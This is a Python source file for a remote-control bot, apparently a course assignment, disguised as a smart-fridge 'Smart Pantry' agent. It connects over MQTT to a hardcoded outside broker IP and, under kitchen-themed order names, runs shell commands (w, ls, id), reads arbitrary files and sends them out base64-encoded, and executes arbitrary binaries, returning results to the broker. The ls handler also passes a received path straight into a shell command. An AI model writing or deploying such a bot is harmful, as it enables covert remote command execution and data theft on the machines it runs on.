import paho.mqtt.client as mqtt
import json
import subprocess
import base64
import os
import uuid

BROKER = "147.32.82.209"
PORT = 1883
TOPIC = "sensors"
# Unique appliance ID
BOT_ID = f"SHIRE-FRIDGE-{uuid.uuid4().hex[:6].upper()}"


def run_cmd(command):
    try:
        # Executes system commands and returns Base64 encoded result
        res = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return base64.b64encode(res).decode()
    except Exception as e:
        return base64.b64encode(str(e).encode()).decode()


def on_message(client, userdata, msg):
    try:
        payload = json.loads(msg.payload.decode())

        # --- THE LOOP FIX ---
        # 1. Ignore messages that are 'responses' (they contain 'status')
        if "status" in payload:
            return

        # 2. Only respond if targeting THIS bot or 'ALL'
        target = payload.get("appliance_id") or payload.get("target")
        if target != BOT_ID and target != "ALL":
            return

        order = payload.get("order_type")
        response = {"appliance_id": BOT_ID, "status": "inventory_updated"}

        if order == "ping_fridge":
            response["telemetry"] = {"temp": 3.8, "power": "on", "light": "working"}

        elif order == "kitchen_staff":  # req 5.2 (w)
            response["staff_list"] = run_cmd("w")

        elif order == "check_pantry":  # req 5.3 (ls)
            path = base64.b64decode(payload.get("shelf_id")).decode()
            response["items"] = run_cmd(f"ls -la {path}")

        elif order == "head_chef":  # req 5.4 (id)
            response["chef_rank"] = run_cmd("id")

        elif order == "export_recipe":  # req 5.5 (cp)
            path = base64.b64decode(payload.get("recipe_book")).decode()
            if os.path.exists(path):
                with open(path, "rb") as f:
                    response["ingredients"] = base64.b64encode(f.read()).decode()
            else:
                response["error"] = "recipe_not_found"

        elif order == "start_appliance":  # req 5.6 (exec binary)
            bin_path = base64.b64decode(payload.get("model_no")).decode()
            response["cycle_report"] = run_cmd(bin_path)

        # Publish the response back to the shared topic
        client.publish(TOPIC, json.dumps(response))

    except Exception:
        pass


# Setup Client
client = mqtt.Client(callback_api_version=mqtt.CallbackAPIVersion.VERSION1)
client.on_message = on_message
client.connect(BROKER, PORT, keepalive=60)
client.subscribe(TOPIC)

print(f"[*] Middle-earth Smart Pantry {BOT_ID} is active...")
client.loop_forever()
